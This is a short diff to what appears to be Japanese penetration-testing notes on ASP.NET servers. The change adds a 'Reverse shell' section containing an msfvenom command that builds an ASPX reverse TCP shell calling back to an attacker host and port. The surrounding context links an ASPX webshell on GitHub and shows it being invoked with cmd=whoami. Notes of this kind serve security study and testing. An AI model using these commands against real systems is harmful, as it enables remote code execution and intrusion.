@@ -426,7 +426,9 @@ ASP.NET framework（旧）を除き、通常は以下の階層に公開用ファ
     - `web.config` のみ：旧世代（framework）
     - `appsettings.json` や `*.dll` が大量にある：新世代（Core系）
 
-### 基本 Web Shell
+### 基本 ペイロード
+
+#### Web shell 
 
 - Payload
 	- [cmdexec.aspx - GitHub](https://github.com/tennc/webshell/blob/master/aspx/asp.net-backdoors/cmdexec.aspx)
@@ -453,6 +455,15 @@ Response.Write(
 ```
 http://target/shell.aspx?cmd=whoami
 ```
+
+#### Reverse shell 
+
+- 関連ノート：[[☠️Msfvenom]]
+
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<AttackerIP> LPORT=<Port> -f aspx -o reverse.aspx​​
+```
+
 
 ### Identify Target
 
